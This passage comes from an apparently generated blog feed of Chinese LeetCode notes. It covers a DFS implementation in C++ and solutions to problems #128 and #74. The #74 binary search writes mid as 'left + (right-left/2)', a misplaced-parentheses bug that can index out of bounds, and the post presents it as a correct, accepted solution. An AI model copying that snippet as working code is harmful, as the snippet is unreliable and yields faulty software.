相連的節點都已經拜訪過了，因此需要回到上一個節點 vertex(C)<br>(2) vertex(F) 標注為 finished (這裏用藍色表示)<br>(3) 更新 <code>finish</code> 為 <code>++time</code> (所以這裡 <code>finish[F]=14</code>)</p><p><em>Step15 - vertex(C) 為起點</em><br>(1) vertex(C) 相連的節點都已經拜訪過了，因此需要回到上一個節點 vertex(A)<br>(2) vertex(C) 標注為 finished (這裏用藍色表示)<br>(3) 更新 <code>finish</code> 為 <code>++time</code> (所以這裡 <code>finish[C]=15</code>)</p><p><em>Step16 - vertex(A) 為起點</em><br>(1) vertex(A) 相連的節點都已經拜訪過了，已經是圖的起點<br>(2) vertex(A) 標注為 finished (這裏用藍色表示)<br>(3) 更新 <code>finish</code> 為 <code>++time</code> (所以這裡 <code>finish[A]=16</code>)</p><p>結束 <code>dfs()</code></p><p>這裡可以將每個 vertex 耗費的 Timestamp展開會是像下面這樣：</p><p><img src="/img/LeetCode/graph/output.png"></p><blockquote><p>可以看出 DFS 一樣會是一種遞迴結構，因此實際上實作也是透過遞迴來實作</p></blockquote><h2 id="程式碼實作-1"><a href="#程式碼實作-1" class="headerlink" title="程式碼實作"></a>程式碼實作</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Graph</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="type">int</span> num_vertex;</span><br><span class="line">        vector&lt;list&lt;<span class="type">int</span>&gt;&gt; adjList;</span><br><span class="line">        <span class="type">int</span> *visited,  <span class="comment">// 0: Not visited, 1: Visited, not finished, 2: Finished </span></span><br><span class="line">            *predecessor,</span><br><span class="line">            *discover,</span><br><span class="line">            *finish;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="built_in">Graph</span>(): <span class="built_in">num_vertex</span>(<span class="number">0</span>)&#123;&#125;;</span><br><span class="line">        <span class="built_in">Graph</span>(<span class="type">int</span> N): <span class="built_in">num_vertex</span>(N)&#123;</span><br><span class="line">            adjList.<span class="built_in">resize</span>(num_vertex);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Member functions</span></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">addEdgeList</span><span class="params">(<span class="type">int</span> from, <span class="type">int</span> to)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> start)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">dfsVisit</span><span class="params">(<span class="type">int</span> vertex, <span class="type">int</span> &amp;time)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">printDiscoverAndFinishTimes</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Graph::addEdgeList</span><span class="params">(<span class="type">int</span> from, <span class="type">int</span> to)</span></span>&#123;</span><br><span class="line">    adjList[from].<span class="built_in">push_back</span>(to);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Graph::dfs</span><span class="params">(<span class="type">int</span> start)</span></span>&#123;</span><br><span class="line">    <span class="comment">// Initialize arrays</span></span><br><span class="line">    visited = <span class="keyword">new</span> <span class="type">int</span>[num_vertex];</span><br><span class="line">    predecessor = <span class="keyword">new</span> <span class="type">int</span>[num_vertex];</span><br><span class="line">    discover = <span class="keyword">new</span> <span class="type">int</span>[num_vertex];</span><br><span class="line">    finish = <span class="keyword">new</span> <span class="type">int</span>[num_vertex];</span><br><span class="line">    <span class="type">int</span> time = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; num_vertex; i++)&#123;</span><br><span class="line">        visited[i] = <span class="number">0</span>;</span><br><span class="line">        predecessor[i] = <span class="number">-1</span>;</span><br><span class="line">        discover[i] = <span class="number">0</span>;</span><br><span class="line">        finish[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If vertices are unvisited, then visit them</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = start; i &lt; num_vertex; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(visited[i] == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">dfsVisit</span>(i, time);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Graph::dfsVisit</span><span class="params">(<span class="type">int</span> vertex, <span class="type">int</span> &amp;time)</span></span>&#123;</span><br><span class="line">    visited[vertex] = <span class="number">1</span>;</span><br><span class="line">    discover[vertex] = ++time;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> it = adjList[vertex].<span class="built_in">begin</span>(); it != adjList[vertex].<span class="built_in">end</span>(); ++it)&#123;</span><br><span class="line">        <span class="keyword">if</span>(visited[*it] == <span class="number">0</span>)&#123;</span><br><span class="line">            predecessor[*it] = vertex;</span><br><span class="line">            <span class="built_in">dfsVisit</span>(*it, time);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    visited[vertex] = <span class="number">2</span>;</span><br><span class="line">    finish[vertex] = ++time;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Graph::printDiscoverAndFinishTimes</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Vertex\tDiscover\tFinish&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; num_vertex; i++)&#123;</span><br><span class="line">        cout &lt;&lt; i &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; discover[i] &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; finish[i] &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">Graph <span class="title">g2</span><span class="params">(<span class="number">8</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    g2.<span class="built_in">addEdgeList</span>(<span class="number">0</span>, <span class="number">1</span>); g2.<span class="built_in">addEdgeList</span>(<span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">    g2.<span class="built_in">addEdgeList</span>(<span class="number">1</span>, <span class="number">3</span>);</span><br><span class="line">    g2.<span class="built_in">addEdgeList</span>(<span class="number">2</span>, <span class="number">5</span>);</span><br><span class="line">    g2.<span class="built_in">addEdgeList</span>(<span class="number">3</span>, <span class="number">7</span>);</span><br><span class="line">    g2.<span class="built_in">addEdgeList</span>(<span class="number">4</span>, <span class="number">1</span>); g2.<span class="built_in">addEdgeList</span>(<span class="number">4</span>, <span class="number">3</span>); g2.<span class="built_in">addEdgeList</span>(<span class="number">4</span>, <span class="number">7</span>);</span><br><span class="line">    g2.<span class="built_in">addEdgeList</span>(<span class="number">5</span>, <span class="number">4</span>); g2.<span class="built_in">addEdgeList</span>(<span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">    g2.<span class="built_in">addEdgeList</span>(<span class="number">6</span>, <span class="number">3</span>); g2.<span class="built_in">addEdgeList</span>(<span class="number">6</span>, <span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">    g2.<span class="built_in">dfs</span>(<span class="number">0</span>);</span><br><span class="line">    g2.<span class="built_in">printDiscoverAndFinishTimes</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>建構樹的方式跟BFS一樣，不同的是這個範例會是有向圖，程式主體由 <code>dfs</code> 以及 <code>dfsVisit</code> 兩個函數所組成。首先可以看到 <code>dfs</code>， 一開始會按照 <code>num_vertex</code> 大小來去初始化各類變數，分配記憶體位址。並且除了 <code>predecessor</code><br>初始化成 -1 之外其餘變數都初始化為 0。接著開始迭代檢查每個節點是否有拜訪過 (<code>if(visit[i]==0)</code>) 如果是還沒拜訪過的 (就是上面圖中是白色節點的) ，就會以該節點作為起點丟到 <code>dfsVisit</code> 進行拜訪。透過這個迴圈可以確保把 <code>adjList</code> 中的 vertex 都搜尋過一次。</p><p>一旦有vertex被發現而且是白色, 便進入 <code>dfsVisit</code>，此時做的第一件事情就是要更新 <code>visited[vertex]=1</code>，代表該節點已找到，但以該節點為起點的搜尋還沒結束， 然後更新發現時間  <code>discover[vertex] = ++time</code>。 <strong>以當前 vertex為搜尋起點，接著要去查找跟該節點用edge相連的vertex中，有哪些還是未被搜尋過的 (<code>visited[i]==0</code>)</strong> 所以以當前的節點來進行迭代 <code>for(auto it=adjList[vertex].begin(); it!=adjList[vertex].end(); ++it)</code> 而這裡就會按照 adjList 中節點的建構順序進行查找。一旦有搜尋到尚未拜訪過的節點，就會將當前節點更新為 <code>predecessor</code> 並且會以該節點做為新的搜尋起點，一樣遞迴下去搜尋其他新節點。 一旦已經沒有其他相連的vertex是還沒拜訪過的，就會將當前節點標註為搜尋完成 <code>visited[vertex]=2</code> 這時候還要去更新搜尋完畢的時間 <code>finish[vertex] = ++time</code>。</p><p>輸出結果:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">VertexDiscoverFinish</span><br><span class="line">0116</span><br><span class="line">127</span><br><span class="line">2815</span><br><span class="line">336</span><br><span class="line">41011</span><br><span class="line">5914</span><br><span class="line">61213</span><br><span class="line">745</span><br></pre></td></tr></table></figure><p>可以觀察到輸出結果與先前演算法介紹中的結果是一樣的</p><h2 id="延伸概念-1"><a href="#延伸概念-1" class="headerlink" title="延伸概念"></a>延伸概念</h2><p>跟 BFS一樣，DFS一樣可以透過 Predecessor 來得到 <strong>Predecessor Subgraph</strong>，一樣會形成一種樹狀結構，被稱為 <strong>Depth-First Tree</strong></p><p><img src="/img/LeetCode/graph/dfs-4.png"></p><p>另外從結果也能夠得出幾個關於 <code>discover</code> 的特性:</p><ul><li>若 $discover[X] &gt; discover[Y]$ 且 $finish[X] &lt; finish[Y]$ ，<strong>則 vertex(X) 一定會是 vertex(Y) 的 descendant</strong> 。 因為這就代表 vertex(X) 比 vertex(Y) 還要晚發現，並且也比較早搜尋完畢。</li><li>若 $discover[X] &lt; discover[Y]$ 且 $finish[X] &gt; finish[Y]$ ，<strong>則 vertex(X) 一定會是 vertex(Y) 的 ancestor</strong>。 因為這就代表 vertex(X) 比 vertex(Y) 還要早發現，並且也比較晚搜尋完畢。</li></ul><h1 id="參考"><a href="#參考" class="headerlink" title="參考"></a>參考</h1><p><a href="https://alrightchiu.github.io/SecondRound/graph-breadth-first-searchbfsguang-du-you-xian-sou-xun.html">https://alrightchiu.github.io/SecondRound/graph-breadth-first-searchbfsguang-du-you-xian-sou-xun.html</a><br><a href="https://alrightchiu.github.io/SecondRound/graph-depth-first-searchdfsshen-du-you-xian-sou-xun.html">https://alrightchiu.github.io/SecondRound/graph-depth-first-searchdfsshen-du-you-xian-sou-xun.html</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Graph </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最長連續序列 | Medium | LeetCode#128. Longest Consecutive Sequence</title>
      <link href="/posts/5405cff7.html"/>
      <url>/posts/5405cff7.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/128/question.jpeg"></p><ul><li>題目難度: <code>Medium</code></li><li>題目敘述: 題目給定一個未排序的整數陣列 <code>nums</code>，請回傳它元素的最長度序列， <strong>本題要求實踐出的演算法複雜度為 $O(n)$</strong></li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>雖然這題的 tag 在 LeetCode 裡面是有 hash table，但其實這題應該可以不用到它，我的想法是 <strong>既然是未排序，但又要找連續序列，那就將它排序再迭代去檢查就好。</strong></p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">longestConsecutive</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(nums.<span class="built_in">size</span>()==<span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> counter = <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> maxValue = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;nums.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i]-nums[i<span class="number">-1</span>] == <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[i]-nums[i<span class="number">-1</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">                counter++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                counter = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            maxValue = <span class="built_in">max</span>(maxValue, counter);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> maxValue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>除了 <code>nums</code> 為空或者只有一個元素的狀況之外，我們先將 <code>nums</code> 排序，排序完畢後就迭代它，從 <code>i=1</code> 開始如果跟前一個元素相等就跳過這輪，如果相差一那就代表為連續序列，將 <code>counter</code> 加一，如果相差不為一，那就將 <code>counter</code> 回到原本的 1，每迴圈中都可以去計算當前的　<code>counter</code> 值是否是最大值，將最大 <code>counter</code> 值保存到 <code>maxValue</code> 最後回傳即可。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/128/result.jpeg"></p><blockquote><p>但其實這樣的複雜度會是 $O(n \cdot log(n))$，因此換成別種做法!</p></blockquote><h2 id="另一種做法"><a href="#另一種做法" class="headerlink" title="另一種做法"></a>另一種做法</h2><p><strong>另一種做法就是使用 <code>unordered_set</code>，這種方法不需要排序，只需用集合檢查每個數是否是連續序列的起點：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">longestConsecutive</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> maxValue = <span class="number">0</span>;</span><br><span class="line">    <span class="function">unordered_set&lt;<span class="type">int</span>&gt; <span class="title">uset</span><span class="params">(nums.begin(), nums.end())</span></span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> num: uset)&#123;</span><br><span class="line">        <span class="keyword">if</span>(uset.<span class="built_in">count</span>(num<span class="number">-1</span>)== <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="type">int</span> counNum =num; </span><br><span class="line">            <span class="type">int</span> counter=<span class="number">1</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span>(uset.<span class="built_in">count</span>(counNum+<span class="number">1</span>))&#123;</span><br><span class="line">                counNum++;</span><br><span class="line">                counter++;</span><br><span class="line">            &#125;</span><br><span class="line">            maxValue = <span class="built_in">max</span>(maxValue, counter);</span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> maxValue;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在 <code>unordered_set</code> 中，可以透過 <code>count</code> 方法來確認集合中的元素是否存在，如果存在就回傳1，不存在就回傳 0</p></blockquote><p>首先程式定義了一個 <code>unordered_set</code> 其中元素為 <code>nums</code>　中的非重複元素。　接著迭代<code>uset</code>，<code>f(uset.count(num-1)== 0)</code> 這裡是要確定元素是否是序列起點，舉例來說</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;int&gt; nums = &#123;100, 4, 200, 1, 3, 2&#125;;</span><br><span class="line"></span><br><span class="line">100是序列起點，但後續沒有連續數字，序列長度為 1</span><br><span class="line">4 不是序列起點，因為 3 存在於集合中。</span><br><span class="line">200 是序列起點，但後續沒有連續數字，序列長度為 1</span><br><span class="line">1 是序列起點，連續序列為 &#123;1, 2, 3, 4&#125;，序列長度為 4</span><br></pre></td></tr></table></figure><p>如果當前元素是序列起點，接著就從起點開始，檢查序列中的後續數字是否存在，並計算當前序列長度</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (numSet.<span class="built_in">count</span>(currentNum + <span class="number">1</span>)) &#123;</span><br><span class="line">    currentNum++;</span><br><span class="line">    counter++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>計算長度結束就可以更新最大值 (<code>maxValue = max(maxValue, counter);</code>)，最後回傳即可。</p><blockquote><p>其實這是我第一次使用 <code>unordered_set</code>，可以參考一下 <a href="https://shengyu7697.github.io/std-unordered_set/">這篇</a> 來了解使用方法</p></blockquote><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>時間複雜度: $O(n \cdot log(n))$<br>時間複雜度(使用 <code>unordered_set</code>): $O(n)$</p><p>空間複雜度: $O(1)$<br>空間複雜度(使用 <code>unordered_set</code>): $O(n)$</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Array </tag>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搜尋二維矩陣 | Medium | LeetCode#74. Search a 2D Matrix</title>
      <link href="/posts/975824a6.html"/>
      <url>/posts/975824a6.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/74/question1.jpeg"><br><img src="/img/LeetCode/74/question2.jpeg"></p><ul><li><p>題目難度: <code>Medium</code></p></li><li><p>題目敘述: 題目給定一個大小 <code>m x n</code> 的整數矩陣 <code>matrix</code>，並且遵循下面兩個特性：</p><ul><li>每一行中元素都以非遞減排序</li><li>每一行的第一個元素都大於上一行的最後一個元素</li></ul><p>  此時題目給定一個整數 <code>target</code> 請回傳 <code>target</code> 是否存在於 <code>matrix</code></p></li></ul><blockquote><p>題目額外限制實踐出的解法必須為 $O(log(m \times n))$ </p></blockquote><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>最直覺還是使用暴力解，就雙重迴圈迭代下去．但這樣複雜度會是 $O(m \times n)$，排序資料比大小正常來說會想到二元搜索，而現在題目是二維矩陣， <strong>此時可以嘗試將二維陣列同樣用一維的方式進行二元搜索，只要注意最後 index 的計算即可</strong></p><h2 id="解法-Binary-Search"><a href="#解法-Binary-Search" class="headerlink" title="解法 - Binary Search"></a>解法 - Binary Search</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">searchMatrix</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; matrix, <span class="type">int</span> target)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> m = matrix.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = matrix[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> left=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> right = m*n<span class="number">-1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(left &lt;= right)&#123;</span><br><span class="line">            <span class="type">int</span> mid = left + (right-left/<span class="number">2</span>);</span><br><span class="line">            <span class="type">int</span> midValue = matrix[mid/n][mid%n];</span><br><span class="line">            <span class="keyword">if</span>(midValue == target) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(target &lt; midValue)&#123;</span><br><span class="line">                right = mid<span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(target &gt; midValue)&#123;</span><br><span class="line">                left = mid+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在標準二元搜索中會先定義出邊界： <code>left</code>, <code>right</code>， <strong>這邊可以想像成將二維陣列拼接成一維度很長的陣列</strong> ，那這裏的 <code>right</code> 會是二維陣列中的最後一個元素，如果 <code>5*6</code> 大小的陣列，那邊界就會是 <code>0</code> 到 <code>29</code>。</p><p>接著透過 <code>left&lt;=left</code> 作為條件包夾出搜尋區間，然後定義中間值 <code>mid = left + (right - left/2)</code> 這會是超長一維陣列的中間值，因此需要對應到二為陣列找到它的 index，可以先知道它是在哪一行， <strong>想像超長陣列每 <code>n</code> 個元素就會是一列，因此中間值會是第 <code>mid/n</code> 列，並且剩餘的餘數會是他在第幾個 column，因此中間值 <code>midValue</code> 的定義就會是 <code>matrix[mid/n][mid%n]</code>。</strong> </p><p>定義完畢中間值後，就可以來搜尋這個超長一維陣列了，若找到中間值 <code>midValue</code> 則回傳 <code>true</code> 若 <code>target &lt; midValue</code> 則將右邊範圍收窄，將其指定為 <code>mid-1</code> 而反之則將左邊收窄，將 <code>left</code> 指定為 <code>mid+1</code>。一旦超長迴圈都找遍了還是沒有 <code>target</code> 就回傳 <code>false</code>。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/74/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>時間複雜度: $O(log(m \times n))$<br>空間複雜度: $O(1)$</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Matrix </tag>
            
            <tag> Binary Search </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷題知識整理 | 圖(Graph)</title>
      <link href="/posts/2009beb7.html"/>
      <url>/posts/2009beb7.html</url>
      
